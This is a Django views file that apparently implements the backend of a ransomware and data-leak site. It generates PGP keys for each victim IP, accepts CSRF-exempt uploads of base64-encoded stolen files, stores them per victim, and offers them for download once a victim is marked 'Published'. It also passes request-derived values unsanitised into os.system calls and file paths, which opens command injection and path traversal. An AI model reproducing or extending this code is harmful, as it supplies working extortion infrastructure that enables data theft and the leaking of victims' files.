from django.shortcuts import render
from django.http import HttpResponse,Http404,JsonResponse
import os
import random
import base64
from .forms import RansomFile
from django.views.decorators.csrf import csrf_exempt
import datetime
from .models import File,UserRansom
from django.conf import settings
import mimetypes


def ransom_id(request,ransom_id):
    ransom_user = UserRansom.objects.get(id=ransom_id)
    context = {
            'ransom_users' : ransom_user,
    }
    return render(request,'web/ransom_victim.html',context=context)


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:ip = x_forwarded_for.split(',')[-1].strip()
    else:ip = request.META.get('REMOTE_ADDR')
    return ip

def create_public_and_private_key(password,username,gmail):
    os.system("gpg --quick-gen-key --batch --passphrase '{}' {}".format(password,gmail))
    os.system("gpg --batch --passphrase '{}' --pinentry-mode=loopback --output /home/ains-username/Documents/ProjectRansomWebsite/certs/{}__private.pgp --armor --export-secret-key {}".format(password,username,gmail)) 
    os.system("gpg --output /home/ains-username/Documents/ProjectRansomWebsite/certs/{}__publica.asc --armor --export {}".format(username,gmail))
    
    return "/home/ains-username/Documents/ProjectRansomWebsite/certs/{}__publica.asc".format(username),"/home/ains-username/Documents/ProjectRansomWebsite/certs/{}__private.pgp".format(username)


def index_view(request):
    max_iteraciones = 9 - UserRansom.objects.all().count()
    max_iteraciones = max(0, max_iteraciones);range_list = list(range(max_iteraciones))
    context = {
        'UserRansom' : UserRansom.objects.all(),
        'EmptyUser': range_list,
    }
    return render(request,'web/index.html',context)

def keys_generator_view(request):
    ipaddrclient = get_client_ip(request)
    
    UserAlderyExist = False

    username = str(ipaddrclient) + "#"+ str(random.randint(500,9999)) 
    username_mail = str(username) + "@gmail.com"

    certs_password_random = random.randint(00000000,99999999)

    public_key,private_key = create_public_and_private_key("123456",username,username_mail)
    
    with open(public_key, 'rb') as file:
        public_key_data_bytes = file.read()
        public_key_data_base64 = base64.b64encode(public_key_data_bytes).decode('utf-8')


    for user in UserRansom.objects.all():
        if user.UserName == ipaddrclient: 
            UserAlderyExist = True  
            ActiveUser = user
          
    if UserAlderyExist == False: ActiveUser = UserRansom.objects.create(UserName=ipaddrclient,CertsLocation=username_mail,CertsPassword=certs_password_random).save()
    print(username_mail)
    
    return JsonResponse({'key':public_key_data_base64})

@csrf_exempt
def upload_files_view(request):
    if request.method == 'POST':
        FILE_NAME_POST_VALUE = request.POST.get('file_name','')
        FILE_CONTENT_POST_VALUE = request.POST.get('file_content','')
        
        ipaddrclient = str(get_client_ip(request))
        
        UserAlderyExist = False
        ActiveUser = None
    
        for user in UserRansom.objects.all():
            if user.UserName == ipaddrclient: 
                UserAlderyExist = True 
                ActiveUser = user
        
        if UserAlderyExist == False: ActiveUser = UserRansom.objects.create(UserName=ipaddrclient);ActiveUser.save()
        
        for user in UserRansom.objects.all():
          if user.UserName == ipaddrclient:  
              UserAlderyExist = True          
              ActiveUser = user


        now = str(datetime.datetime.today().strftime('%m/%d/%Y'))
        now_with_hyphens = now.replace('/', '-')

        ransom_user_file = "/home/ains-username/Documents/ProjectRansomWebsite/files/{}/".format(ActiveUser.UserName)
        os.system("mkdir -p {}".format(ransom_user_file))

        #file_upload = "{}[{}][{}]{}".format(ransom_user_file,now_with_hyphens,ipaddrclient,FILE_NAME_POST_VALUE)
        file_upload = "{}/{}".format(ransom_user_file,FILE_NAME_POST_VALUE)
        decoded_content = base64.b64decode(FILE_CONTENT_POST_VALUE)
        
        CreatedFile = File.objects.create(FileName=FILE_NAME_POST_VALUE,Content=FILE_CONTENT_POST_VALUE)
        CreatedFile.save()
       
        AssignIteam = ActiveUser.Files.add(CreatedFile)
        
        try: 
            with open(file_upload, 'ab') as f: f.write(decoded_content)
        except FileNotFoundError:
            with open(file_upload, 'wb') as f: f.write(decoded_content)

        return HttpResponse(f"<script>location.replace('https://example.com/');</script>") 
    
    else:    return HttpResponse(f"<script>location.replace('https://example.com/');</script>")




def downloadfile(request,victim_id,file):
    active_victim = UserRansom.objects.get(id=victim_id) 
    if active_victim.Published:

        file_path = "{}/files/{}/{}".format(settings.BASE_DIR,active_victim.UserName,file)
        filename = os.path.basename(file_path)
        content_type, _ = mimetypes.guess_type(file_path)
        if content_type is None:
            content_type = 'application/octet-stream'

        try:
            with open(file_path, 'rb') as file:
                response = HttpResponse(file.read(), content_type=content_type)
                response['Content-Disposition'] = 'attachment; filename="{}"'.format(filename)
                return response
   
        except FileNotFoundError:
            return HttpResponse("File not found", status=404)  # E: Argument of type "Literal['File not found']" cannot be assigned to parameter "content" of type "bytes" in function "__init__"   "Literal['File not found']" is incompatible with "bytes"
    else:
        return HttpResponse("Data its not Published yet ",status=301)
